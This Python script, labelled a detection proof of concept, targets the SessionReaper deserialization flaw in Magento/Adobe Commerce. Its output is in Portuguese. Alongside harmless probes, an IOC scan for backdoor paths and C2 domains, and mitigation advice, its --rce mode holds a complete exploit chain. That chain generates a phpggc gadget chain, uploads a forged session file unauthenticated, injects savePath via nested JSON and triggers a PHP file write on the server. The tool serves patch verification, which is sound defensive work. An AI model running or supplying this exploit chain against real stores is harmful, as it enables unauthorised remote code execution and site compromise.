#!/usr/bin/env python3
"""
CVE-2025-54236 — SessionReaper Detection PoC
=============================================
Vulnerability: Unauthenticated nested JSON deserialization → session path override → RCE
Affected:      Adobe Commerce / Magento Open Source <= 2.4.6-p12, 2.4.7-p6, 2.4.8-p1
Patched in:    APSB25-88 (2.4.6-p13+, 2.4.7-p7+, 2.4.8-p2+)
CVSS:          9.1 CRITICAL  (AV:N/AC:L/PR:N/UI:N)

Attack chain (simplified):
  1. POST /customer/address_file/upload     → plant fake session file on disk
  2. POST /rest/V1/guest-carts/abc/order    → inject savePath via nested JSON
  3. GET  / with PHPSESSID=<session_id>     → PHP session_start() deserializes our file
  4. Gadget chain (Guzzle/FW1) writes PHP payload → RCE

This tool is a DETECTION PoC — it tests each stage individually and reports
whether the site is patched, without triggering actual code execution.
Full RCE requires phpggc (https://github.com/ambionics/phpggc) installed locally.

Usage:
  # Detection only (safe — no payload, no RCE):
  python3 sessionreaper_poc.py --target https://www.arlequim.com

  # Full RCE test (requires phpggc):
  python3 sessionreaper_poc.py --target https://www.arlequim.com --rce --phpggc /opt/phpggc/phpggc

  # IOC scan only:
  python3 sessionreaper_poc.py --target https://www.arlequim.com --ioc-only
"""

import argparse
import base64
import hashlib
import json
import os
import random
import re
import shutil
import string
import struct
import subprocess
import sys
import tempfile
import time

import requests
import urllib3
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ── Mascaramento de URL (--redact) ────────────────────────────────────────────
_SR_REDACT_FROM: list[str] = []
_SR_REDACT_TO   = "[REDACTED]"

def mask(text: str) -> str:
    if not _SR_REDACT_FROM:
        return str(text)
    result = str(text)
    for token in _SR_REDACT_FROM:
        result = result.replace(token, _SR_REDACT_TO)
    return result

def _init_redact(target_url: str) -> None:
    parsed = urlparse(target_url)
    host   = parsed.hostname or ""
    parts  = host.split(".")
    global _SR_REDACT_TO
    _SR_REDACT_TO = "[REDACTED]"
    tokens = set()
    tokens.add(target_url.rstrip("/"))
    tokens.add(host)
    if host.startswith("www."):
        tokens.add(host[4:])
    else:
        tokens.add(f"www.{host}")
    _SR_REDACT_FROM.extend(sorted(tokens, key=len, reverse=True))

CANARY_TOKEN  = hashlib.md5(b"sessionreaper_canary_2025").hexdigest()
CANARY_MARKER = f"SESSIONREAPER_CANARY_{CANARY_TOKEN}"

# Known IOC paths from real-world exploitation campaigns
IOC_PATHS = [
    "accesson.php",
    "pub/accesson.php",
    "errors/404.php",          # common payload-out target
    "pub/errors/404.php",
    "pub/health_check.php",
    "pub/errors/report.php",
    "pub/index.php",
    "pub/static/accesson.php",
    "pub/media/customer_address/accesson.php",
    "pub/media/customer_address/index.php",
    "media/customer_address/accesson.php",
]

# C2 domains seen in real attacks
MALICIOUS_DOMAINS = [
    "sagecrafft.com",
    "worcksbot.com",
    "lanhd6549tdhse.top",
    "jslibrary.net",
    "canevaslab.com",
]

HEADERS = {"Content-Type": "application/json", "Accept": "application/json"}


def banner():
    print("""
╔══════════════════════════════════════════════════════════════════╗
║    CVE-2025-54236  SessionReaper  —  PoC de Detecção            ║
║    Apenas para testes autorizados em sistemas que você possui   ║
╚══════════════════════════════════════════════════════════════════╝
""")


def step(n, msg):  print(mask(f"  [{n}] {msg}"))
def ok(msg):       print(mask(f"      ✔  {msg}"))
def warn(msg):     print(mask(f"      ⚠  {msg}"))
def fail(msg):     print(mask(f"      ✘  {msg}"))


def rand_str(n=26):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))


# ─────────────────────────────────────────────────────────────────────────────
# Stage 1 — Test the upload endpoint
# POST /customer/address_file/upload
# The endpoint accepts file uploads without authentication.
# On a PATCHED store: returns 403, redirect to login, or blocks upload.
# On a VULNERABLE store: returns 200 with a file path in the response.
# ─────────────────────────────────────────────────────────────────────────────
def test_upload_endpoint(base_url: str, session: requests.Session) -> dict:
    step(1, "Testando /customer/address_file/upload (sem autenticação)...")
    url = f"{base_url}/customer/address_file/upload"
    form_key = rand_str(16)

    # Safe probe: send a plain text file — no gadget chain, no PHP
    safe_content = f"SessionReaper detection probe {CANARY_MARKER}\n".encode()

    result = {"accessible": False, "status": None, "file_path": None, "response": ""}

    try:
        r = session.post(
            url,
            files={
                "form_key": (None, form_key),
                "custom_attributes[country_id]": (
                    "probe.txt", safe_content, "application/octet-stream"
                ),
            },
            cookies={"form_key": form_key},
            timeout=20,
        )
        result["status"] = r.status_code
        result["response"] = r.text[:400]

        if r.status_code == 200:
            result["accessible"] = True
            # Try to extract the path Magento saved the file to
            try:
                data = r.json()
                path = data.get("file") or data.get("path") or data.get("url", "")
                if path:
                    result["file_path"] = path
                    ok(f"Upload aceito — arquivo salvo em: {path}")
                else:
                    warn(f"Upload retornou 200 mas sem caminho do arquivo na resposta: {r.text[:200]}")
            except Exception:
                warn(f"Upload retornou 200 (não-JSON): {r.text[:200]}")

        elif r.status_code in (302, 301):
            location = r.headers.get("Location", "")
            if "login" in location.lower() or "account" in location.lower():
                ok(f"Upload redireciona para login ({location}) — autenticação necessária, endpoint protegido")
            else:
                warn(f"Upload redirecionado para: {location}")

        elif r.status_code == 403:
            ok("Endpoint retornou 403 — acesso bloqueado (corrigido ou regra WAF)")

        elif r.status_code == 404:
            ok("Endpoint retornou 404 — endpoint não existe nesta loja")

        else:
            warn(f"Endpoint de upload retornou HTTP {r.status_code}: {r.text[:200]}")

    except requests.RequestException as e:
        fail(f"Erro na requisição: {e}")

    return result


# ─────────────────────────────────────────────────────────────────────────────
# Stage 2 — Test savePath injection via nested JSON
# Three vectors from the public PoC — test all three.
# On PATCHED: returns 400 "Invalid type given" or ignores the nested objects.
# On VULNERABLE: accepts the payload silently (no error) or returns a different
#   error (e.g. "cart not found") that proves the inner JSON was processed.
# ─────────────────────────────────────────────────────────────────────────────
def test_savepath_injection(base_url: str, session: requests.Session) -> dict:
    step(2, "Testando injeção de savePath via JSON aninhado (3 vetores)...")

    fake_save_path = "media/customer_address/s/e/"
    sessid = rand_str(26)

    vectors = [
        {
            "name": "order",
            "method": "PUT",
            "url": f"{base_url}/rest/default/V1/guest-carts/abc/order",
            "body": {
                "paymentMethod": {
                    "paymentData": {
                        "context": {
                            "urlBuilder": {
                                "session": {
                                    "sessionConfig": {"savePath": fake_save_path}
                                }
                            }
                        }
                    }
                }
            },
        },
        {
            "name": "checkmo",
            "method": "POST",
            "url": f"{base_url}/rest/default/V1/guest-carts/abc/set-payment-information",
            "body": {
                "paymentMethod": {
                    "method": "checkmo",
                    "paymentData": {
                        "context": {
                            "urlBuilder": {
                                "session": {
                                    "sessionConfig": {"savePath": fake_save_path}
                                }
                            }
                        }
                    }
                }
            },
        },
        {
            "name": "estimate",
            "method": "POST",
            "url": f"{base_url}/rest/default/V1/guest-carts/abc/estimate-shipping-methods",
            "body": {
                "address": {
                    "addressConfig": {
                        "addressHelper": {
                            "context": {
                                "urlBuilder": {
                                    "session": {
                                        "sessionConfig": {"savePath": fake_save_path}
                                    }
                                }
                            }
                        }
                    }
                }
            },
        },
    ]

    results = {}

    for v in vectors:
        try:
            if v["method"] == "PUT":
                r = session.put(
                    v["url"], json=v["body"], headers=HEADERS,
                    cookies={"PHPSESSID": sessid}, timeout=15,
                )
            else:
                r = session.post(
                    v["url"], json=v["body"], headers=HEADERS,
                    cookies={"PHPSESSID": sessid}, timeout=15,
                )

            body = r.text[:300]
            result = {"status": r.status_code, "body": body, "verdict": "unknown"}

            # Interpretation:
            # Patched: 400 with "Invalid type" / "not an instance" / type validation error
            # Vulnerable: 400/500 with "cart not found", "no such entity", schema errors
            #   that prove the nested objects WERE processed by ServiceInputProcessor
            patched_signals = [
                "invalid type", "not an instance of", "type validation",
                "unexpected type", "cannot convert", "expected type",
            ]
            vuln_signals = [
                "no such entity", "cart is not found", "cartid is not found",
                "no such cart", "internal error", "localizedexception",
                "could not process", "serializ", "unserializ",
            ]

            body_lower = body.lower()
            if any(s in body_lower for s in patched_signals):
                result["verdict"] = "CORRIGIDO"
                ok(f"Vetor '{v['name']}': validação de tipo rejeitou o payload → CORRIGIDO")
            elif any(s in body_lower for s in vuln_signals):
                result["verdict"] = "VULNERABLE"
                warn(f"Vetor '{v['name']}': JSON aninhado processado (erro de carrinho/entidade) → pode ser VULNERÁVEL")
            elif r.status_code == 404:
                result["verdict"] = "endpoint_missing"
                ok(f"Vetor '{v['name']}': endpoint 404 — não aplicável nesta loja")
            elif r.status_code == 403:
                result["verdict"] = "blocked"
                ok(f"Vetor '{v['name']}': 403 — endpoint bloqueado")
            else:
                result["verdict"] = f"inconclusive (HTTP {r.status_code})"
                warn(f"Vetor '{v['name']}': HTTP {r.status_code} — {body[:120]}")

            results[v["name"]] = result

        except requests.RequestException as e:
            fail(f"Vetor '{v['name']}': erro na requisição — {e}")
            results[v["name"]] = {"status": None, "verdict": "error", "body": str(e)}

    return results


# ─────────────────────────────────────────────────────────────────────────────
# Stage 3 — Check if file-based sessions are in use
# Redis/Valkey/database sessions are NOT vulnerable to the deserialization step.
# We probe for Redis indicators in the Magento config endpoints.
# ─────────────────────────────────────────────────────────────────────────────
def check_session_storage(base_url: str, session: requests.Session) -> str:
    step(3, "Verificando tipo de armazenamento de sessão (baseado em arquivo = vulnerável à deserialização)...")
    # Magento exposes session type in health check or config endpoint on some versions
    hints = []

    try:
        r = session.get(f"{base_url}/pub/health_check.php", timeout=10)
        if r.status_code == 200:
            text = r.text.lower()
            if "redis" in text or "valkey" in text:
                ok("health_check.php menciona Redis/Valkey — sessões provavelmente NÃO são baseadas em arquivo")
                return "redis"
    except Exception:
        pass

    # Check response headers for session cookie — if Set-Cookie has PHPSESSID
    # without a path prefix that looks like Redis, it's likely file-based.
    try:
        r = session.get(f"{base_url}/", timeout=10)
        cookies_str = str(r.headers.get("Set-Cookie", ""))
        if "PHPSESSID" in cookies_str:
            hints.append("PHPSESSID cookie seen in response")
    except Exception:
        pass

    # We cannot definitively tell from outside — report inconclusive
    warn("Não é possível confirmar o tipo de sessão remotamente — assumir baseado em arquivo (pior caso)")
    warn("Se sua loja usa sessões Redis, a fase de deserialização NÃO é explorável")
    return "unknown"


# ─────────────────────────────────────────────────────────────────────────────
# Stage 4 — Full RCE test (optional, requires phpggc)
# Only runs with --rce flag. Uses phpinfo() as the payload (not a shell).
# ─────────────────────────────────────────────────────────────────────────────
def full_rce_test(
    base_url: str,
    session: requests.Session,
    phpggc_bin: str,
    payload_out: str = "/var/www/html/pub/errors/404.php",
) -> dict:
    step(4, f"Teste de RCE completo — destino do payload: {payload_out}")
    result = {"executed": False, "url": None}

    # Write a safe phpinfo() payload
    payload_php = f"<?php echo '{CANARY_MARKER}'; phpinfo(); ?>"
    sessid = rand_str(26)
    form_key = rand_str(16)

    with tempfile.NamedTemporaryFile(suffix=".php", mode="w",
                                     delete=False, prefix="payload_") as f:
        f.write(payload_php)
        payload_in = f.name

    sess_file = f"/tmp/sess_{sessid}"

    try:
        # Generate gadget chain with phpggc
        # -s = soft urlencode (safe for session storage), -f = fast-destruct
        cmd = [phpggc_bin, "-s", "-f", "Guzzle/FW1", payload_out, payload_in]
        warn(f"Executando phpggc: {' '.join(cmd)}")
        r = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=30)
        if r.returncode != 0:
            fail(f"phpggc falhou: {r.stderr.decode()}")
            return result

        # Wrap in PHP session format: variable_name|serialized_payload
        # PHP sessions are stored as "<key>|<serialized_value>"
        serialized = r.stdout
        session_data = b"_data|" + serialized
        with open(sess_file, "wb") as sf:
            sf.write(session_data)

        ok(f"Gadget chain escrita em {sess_file} ({os.path.getsize(sess_file)} bytes)")

        # Upload session file
        warn(f"Enviando arquivo de sessão para /customer/address_file/upload...")
        url = f"{base_url}/customer/address_file/upload"
        with open(sess_file, "rb") as sf:
            resp = session.post(
                url,
                files={
                    "form_key": (None, form_key),
                    "custom_attributes[country_id]": (
                        f"sess_{sessid}.bin", sf, "application/octet-stream"
                    ),
                },
                cookies={"form_key": form_key},
                timeout=30,
            )
        ok(f"Upload: HTTP {resp.status_code} — {resp.text[:120]}")

        if resp.status_code != 200:
            warn("Upload falhou — loja pode estar corrigida ou endpoint bloqueado")
            return result

        # Extract save_path from the uploaded file path
        try:
            data = resp.json()
            file_path = data.get("file", "")
            # Convert e.g. "/s/e/sess_abc.bin" to "media/customer_address/s/e/"
            parts = file_path.rsplit("/", 1)
            save_path = "media/customer_address" + parts[0] + "/" if parts else \
                        "media/customer_address/s/e/"
            sessid_for_trigger = "sess_" + parts[-1].replace(".bin", "") \
                                  if parts else sessid
        except Exception:
            save_path = "media/customer_address/s/e/"
            sessid_for_trigger = sessid

        ok(f"Usando savePath: {save_path}")
        ok(f"Usando PHPSESSID: {sessid_for_trigger}")

        # Trigger savePath override
        warn("Injetando savePath via JSON aninhado (método order)...")
        trigger_url = f"{base_url}/rest/default/V1/guest-carts/abc/order"
        body = {
            "paymentMethod": {
                "paymentData": {
                    "context": {
                        "urlBuilder": {
                            "session": {
                                "sessionConfig": {"savePath": save_path}
                            }
                        }
                    }
                }
            }
        }
        session.put(trigger_url, json=body, headers=HEADERS,
                    cookies={"PHPSESSID": sessid_for_trigger}, timeout=15)

        # Trigger session load
        warn("Disparando session_start() com PHPSESSID forjado...")
        session.get(f"{base_url}/", cookies={"PHPSESSID": sessid_for_trigger},
                    timeout=15)
        time.sleep(1)

        # Check if payload was written
        check_url = f"{base_url}/errors/404.php"
        warn(f"Verificando execução do payload em {check_url}...")
        r_check = session.get(check_url, timeout=15)
        if CANARY_MARKER in r_check.text:
            result["executed"] = True
            result["url"] = check_url
            fail(f"!! RCE CONFIRMADO — marcador canary encontrado em {check_url} !!")
        elif "phpinfo" in r_check.text.lower():
            result["executed"] = True
            result["url"] = check_url
            fail(f"!! phpinfo() EXECUTADO em {check_url} !!")
        else:
            ok(f"Sem canary em {check_url} (HTTP {r_check.status_code}) — payload não executado")

    finally:
        for f in [payload_in, sess_file]:
            try:
                os.remove(f)
            except OSError:
                pass

    return result


# ─────────────────────────────────────────────────────────────────────────────
# Passive IOC scan
# ─────────────────────────────────────────────────────────────────────────────
def check_iocs(base_url: str, session: requests.Session) -> list:
    step(5, "Verificação passiva de IOCs — sondando caminhos de backdoor conhecidos...")
    found = []
    for path in IOC_PATHS:
        url = f"{base_url}/{path}"
        try:
            r = session.get(url, timeout=8)
            if r.status_code == 200 and len(r.text) > 10:
                warn(f"BACKDOOR ENCONTRADO: {url}  ({len(r.text)} bytes)")
                found.append(url)
        except Exception:
            pass
    if not found:
        ok("Nenhum caminho de backdoor conhecido respondeu")

    # Check for C2 domains in public JS files
    step("5b", "Verificando referências a domínios C2 maliciosos no JS público...")
    try:
        r = session.get(f"{base_url}/", timeout=10)
        for domain in MALICIOUS_DOMAINS:
            if domain in r.text:
                warn(f"DOMÍNIO MALICIOSO ENCONTRADO no HTML da página inicial: {domain}")
                found.append(f"c2:{domain}")
    except Exception:
        pass
    if not any(f.startswith("c2:") for f in found):
        ok("Nenhum domínio C2 conhecido encontrado na página inicial")

    return found


# ─────────────────────────────────────────────────────────────────────────────
# Report
# ─────────────────────────────────────────────────────────────────────────────
def report(
    target: str,
    upload: dict,
    injections: dict,
    session_storage: str,
    rce: dict,
    iocs: list,
    rce_mode: bool,
):
    print("\n" + "═" * 66)
    print("  RESULTADOS — CVE-2025-54236 SessionReaper")
    print("═" * 66)
    print(mask(f"  Alvo    : {target}"))
    print()

    # Stage 1 — upload
    if not upload.get("accessible"):
        print("  ETAPA 1 — UPLOAD   : BLOQUEADO ou endpoint inexistente")
        print("                       Endpoint de upload não é explorável")
        upload_ok = False
    else:
        print("  ETAPA 1 — UPLOAD   : ARQUIVO ACEITO (endpoint aberto)")
        if upload.get("file_path"):
            print(mask(f"                       Salvo em: {upload['file_path']}"))
        upload_ok = True

    # Stage 2 — injection
    vuln_vectors   = [k for k, v in injections.items() if v.get("verdict") == "VULNERABLE"]
    patched_vectors = [k for k, v in injections.items() if v.get("verdict") == "PATCHED"]
    if vuln_vectors:
        print(f"  ETAPA 2 — INJEÇÃO  : Vetores VULNERÁVEIS: {', '.join(vuln_vectors)}")
        inject_ok = True
    elif patched_vectors:
        print(f"  ETAPA 2 — INJEÇÃO  : CORRIGIDO — validação de tipo rejeitou o payload")
        print(f"                       Vetores corrigidos: {', '.join(patched_vectors)}")
        inject_ok = False
    else:
        print("  ETAPA 2 — INJEÇÃO  : Inconclusivo — verifique os resultados acima")
        inject_ok = False

    # Stage 3 — sessions
    if session_storage == "redis":
        print("  ETAPA 3 — SESSÕES  : Redis detectado → deserialização NÃO é explorável")
    else:
        print("  ETAPA 3 — SESSÕES  : Tipo de armazenamento desconhecido — assumir pior caso (baseado em arquivo)")

    # Stage 4 — RCE
    if rce_mode:
        if rce.get("executed"):
            print(mask(f"  ETAPA 4 — RCE      : !! CONFIRMADO !! payload executado em {rce['url']}"))
        else:
            print("  ETAPA 4 — RCE      : Payload não executou — provavelmente corrigido")
    else:
        print("  ETAPA 4 — RCE      : Não testado (use --rce para testar)")

    # IOCs
    if iocs:
        print(f"\n  !! ACTIVE IOCs FOUND ({len(iocs)}) !!")
        for u in iocs:
            print(mask(f"     {u}"))
    else:
        print("\n  VERIFICAÇÃO IOC    : Limpo")

    # Final verdict
    print("\n" + "─" * 66)
    if rce.get("executed"):
        print("  VEREDICTO: CRÍTICO — RCE CONFIRMADO via SessionReaper")
    elif upload_ok and inject_ok:
        print("  VEREDICTO: ALTO RISCO — Upload + injeção funcionam.")
        print("           RCE completo depende do tipo de armazenamento de sessão.")
        print("           Execute com --rce --phpggc /opt/phpggc/phpggc para confirmar.")
    elif upload_ok and not inject_ok:
        print("  VEREDICTO: PARCIALMENTE CORRIGIDO — Endpoint de upload aberto, mas injeção bloqueada.")
        print("           Aplique o APSB25-88 completamente. Restrinja /customer/address_file/upload.")
    elif not upload_ok and not inject_ok:
        print("  VEREDICTO: APARENTA ESTAR CORRIGIDO (2.4.6-p13+ aplica APSB25-88)")
        print("           Upload e injeção estão bloqueados.")
    else:
        print("  VEREDICTO: INCONCLUSIVO — verificação manual recomendada")

    print("\n" + "═" * 66)
    print("  MITIGAÇÕES")
    print("═" * 66)
    print("""
  1. PATCH — já aplicado no 2.4.6-p13 (APSB25-88) ✓
     A correção de validação de tipo no ServiceInputProcessor bloqueia a injeção de JSON aninhado.

  2. BLOQUEAR endpoint de upload (defesa em profundidade) — nginx:
       location = /customer/address_file/upload {
           deny all;
           return 403;
       }

  3. USAR SESSÕES REDIS — elimina completamente a superfície de deserialização:
       # app/etc/env.php
       'session' => ['save' => 'redis', 'redis' => [...]]

  4. VERIFICAR BACKDOORS no disco:
       find pub/media/customer_address -type f -name "*.php" -o -name "*.phtml"
       find pub/errors -newer pub/errors/error.phtml -type f
       grep -r "eval(base64_decode" pub/ --include="*.php"

  5. Domínios IOC para bloquear no firewall/DNS:
       sagecrafft.com  worcksbot.com  lanhd6549tdhse.top  jslibrary.net
""")


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-54236 SessionReaper — PoC de Detecção"
    )
    parser.add_argument("--target", required=True,
                        help="URL base, ex: https://www.arlequim.com")
    parser.add_argument("--rce", action="store_true",
                        help="Executa teste de RCE completo (requer --phpggc)")
    parser.add_argument("--phpggc", default=None,
                        help="Caminho para o binário phpggc (necessário para --rce)")
    parser.add_argument("--payload-out", default="/var/www/html/pub/errors/404.php",
                        help="Caminho remoto de escrita para gadget chain (padrão: pub/errors/404.php)")
    parser.add_argument("--no-verify", action="store_true",
                        help="Desabilita verificação de certificado TLS")
    parser.add_argument("--ioc-only", action="store_true",
                        help="Executa apenas verificação passiva de IOCs")
    parser.add_argument("--redact", action="store_true",
                        help="Mascara o domínio alvo na saída (para prints/screenshots)")
    args = parser.parse_args()

    banner()
    target = args.target.rstrip("/")

    if args.rce and not args.phpggc:
        # Try to auto-detect phpggc
        found = shutil.which("phpggc")
        if not found:
            for p in ["/opt/phpggc/phpggc", os.path.expanduser("~/phpggc/phpggc")]:
                if os.path.isfile(p) and os.access(p, os.X_OK):
                    found = p
                    break
        if not found:
            print("  [!] --rce requer phpggc. Instale: git clone https://github.com/ambionics/phpggc /opt/phpggc")
            sys.exit(1)
        args.phpggc = found

    if args.redact:
        _init_redact(target)

    session = requests.Session()
    session.verify = not args.no_verify
    session.headers.update({"User-Agent": "SessionReaper-Detection/1.0 (authorized test)"})

    print(mask(f"  Alvo   : {target}"))
    print(f"  Modo   : {'RCE Completo' if args.rce else 'Somente detecção'}")
    print()

    try:
        iocs = check_iocs(target, session)
        if args.ioc_only:
            return

        upload   = test_upload_endpoint(target, session)
        injections = test_savepath_injection(target, session)
        sess_storage = check_session_storage(target, session)
        rce_result = {}
        if args.rce:
            rce_result = full_rce_test(target, session, args.phpggc, args.payload_out)

        report(target, upload, injections, sess_storage, rce_result, iocs, args.rce)

    except KeyboardInterrupt:
        print("\n  [!] Interrompido pelo usuário (Ctrl+C). Encerrando...")
        sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrompido. Saindo.")
        sys.exit(0)
